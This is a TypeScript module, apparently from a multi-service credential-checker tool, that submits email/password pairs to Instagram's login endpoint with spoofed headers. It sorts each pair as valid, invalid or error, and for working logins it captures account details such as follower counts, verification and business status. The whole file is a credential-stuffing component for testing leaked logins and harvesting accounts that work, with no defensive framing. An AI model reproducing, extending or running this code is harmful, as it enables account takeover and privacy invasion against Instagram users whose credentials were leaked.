import { BaseChecker } from './base';
import { CheckResult } from '@/types';

export class InstagramChecker extends BaseChecker {
  async check(email: string, password: string): Promise<CheckResult> {
    try {
      // Instagram login
      const loginResponse = await this.client.post(
        'https://www.instagram.com/accounts/login/ajax/',
        {
          username: email,
          enc_password: `#PWD_INSTAGRAM_BROWSER:0:${Date.now()}:${password}`,
          queryParams: {},
          optIntoOneTap: false,
        },
        {
          headers: {
            'X-CSRFToken': 'missing',
            'X-Instagram-AJAX': '1',
            'X-Requested-With': 'XMLHttpRequest',
          },
        }
      );

      if (loginResponse.data?.authenticated) {
        const capture = await this.getAccountDetails(loginResponse.data.userId);
        return this.createResult(email, password, 'instagram', 'valid', capture);
      }

      return this.createResult(email, password, 'instagram', 'invalid');
    } catch (error: any) {
      return this.createResult(
        email,
        password,
        'instagram',
        'error',
        undefined,
        error.message
      );
    }
  }

  private async getAccountDetails(userId: string) {
    try {
      const response = await this.client.get(
        `https://i.instagram.com/api/v1/users/${userId}/info/`
      );

      const user = response.data?.user;
      return {
        username: user?.username,
        displayName: user?.full_name,
        followers: user?.follower_count,
        following: user?.following_count,
        posts: user?.media_count,
        verified: user?.is_verified,
        isPremium: user?.is_business,
        bio: user?.biography,
      };
    } catch {
      return {};
    }
  }
}
